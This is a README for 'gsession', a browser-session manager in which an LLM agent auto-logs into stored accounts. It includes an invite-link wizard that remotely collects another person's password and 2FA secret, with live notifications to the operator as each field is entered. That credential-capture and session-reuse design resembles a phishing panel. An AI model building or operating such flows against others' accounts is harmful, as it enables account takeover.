# gsession

A remote browser-session manager. An admin panel lists **sessions** — each one is an
isolated, persistent Chrome session (its own cookies, logins and storage, like a
separate Chrome profile). Store a login/password (+ optional 2FA) once, then open,
auto-login, and reuse the session later without signing in again.

## What it does

- **Admin panel** (web UI) with all your sessions as cards.
- **New session** form: name, provider (Google built in), login, password, optional
  2FA (TOTP secret), note.
- **Open** — launches a headed Chrome for that session and pre-warms the agent.
  Cookies persist on disk in `sessions/<id>/`, so it stays logged in between opens.
- **Agent** — an LLM computer-use agent drives the window: you type an instruction
  ("sign in with the stored credentials", "click the number 4", …) and it looks at
  screen screenshots and performs the real mouse/keyboard steps until done.
  - Backed by [`@zavora-ai/computer-use-mcp`](https://github.com/zavora-ai/computer-use-mcp)
    (in-process, native Windows mouse/keyboard) + a vision LLM on an
    OpenAI-compatible endpoint (configured in `.env`: `LLM_BASE_URL`, `LLM_MODEL`).
  - Stored credentials (and the current TOTP code, if a secret is stored) are
    passed to the agent as context, so "sign in" works in one instruction.
  - You can always take over by hand; the window is a normal Chrome window.
- **Close** / **Delete** / **Edit** per session.
- Credentials are **encrypted at rest** (AES-256-GCM). The panel is protected by an
  admin token.

## Setup

```powershell
cd "C:\Users\MGTSM 2025\Documents\gsession"
npm install
npm run setup      # downloads the Chromium browser Playwright needs (one time)
npm start
```

On first `npm start` a `.env` is generated with a fresh encryption key, an admin
token, and `PORT=4599`. The token is printed in the console — copy it, open
`http://localhost:4599`, and paste it into the unlock screen.

## Testing with Google

1. Click **+ New session**, provider **Google**.
2. Enter the test account email + password. If the account has an authenticator
   (TOTP) 2FA, paste its Base32 secret — the agent gets the current code; leave
   blank to hand the code to the agent in the instruction.
3. Save, **Open**, then type an instruction in the card's agent box, e.g.
   **"sign in with the stored credentials"** → **Run**. The panel streams each
   step it performs; watch the real window too.

> **Note on Google:** Google actively detects automation and may show a
> "couldn't verify it's you" / device-confirmation / captcha step, especially the
> first time from a new machine. That's expected — tell the agent what to pick
> ("click the number 4") or finish it by hand. After that, the persistent session
> keeps you logged in and future opens are instant. This tool is intended for
> accounts you own or are authorized to manage (e.g. your test account).

## Invite links + live wizard (remote credential capture)

Instead of typing a user's credentials yourself, send them a link and watch them fill
it in live.

1. In the panel, click **🔗 Generate link** → give it a label (e.g. "John — Gmail")
   and provider → **Create link** → **Copy** the URL and send it to the person.
2. They open the link and go through a **wizard**: Username → Password → 2FA
   (optional) → Done. Each field is submitted as they go.
3. The panel's **🔔 Notifications** drawer updates in real time (Server-Sent Events):
   - "user opened the wizard"
   - "entered username: john@…"
   - "entered password ••••••••" (the value is never shown, only that it happened)
   - "provided a 2FA secret" / "skipped 2FA"
   - "all credentials submitted ✓ session created"
4. On completion, a **session is created automatically** from the collected
   credentials (encrypted), ready for **Auto-login**.

The invite cards at the top of the panel show each link's live progress
(Username ✓ / Password ✓ / 2FA ✓) and status. Passwords and 2FA secrets are encrypted
the moment they're received — plaintext is never written to disk.

Endpoints: `POST /api/invites` (create, admin), `GET /api/events` (SSE feed, admin),
and the public wizard at `/w/:token` backed by `GET|POST /api/wizard/:token(/step|/complete)`.

## Adding other providers later

The provider is just a label + `loginUrl`. Open the session and give the agent an
instruction ("go to the login page and sign in with the stored credentials") —
no per-provider code needed. The persistent session still saves whatever you sign
in as.

## Remote access

The server hosts the browsers where it runs. To use the panel from another machine,
put it behind a reverse proxy / tunnel with HTTPS and keep the admin token secret —
it stores credentials, so never expose it openly on `0.0.0.0` without TLS + the token.

## Layout

```
server.js          Express API + static panel, auth, graceful shutdown
lib/crypto.js      AES-256-GCM encrypt/decrypt for stored secrets
lib/store.js       session metadata store (data/sessions.json)
lib/browser.js     Playwright persistent-context manager (launch/stream only)
lib/agent.js       LLM computer-use agent (screenshot → act loop, MCP in-process)
public/            admin panel (index.html, style.css, app.js)
sessions/<id>/     per-session Chrome user-data dir (persistent cookies)
data/sessions.json session records (passwords/2FA encrypted)
.env               generated: encryption key + admin token + port + LLM settings
```
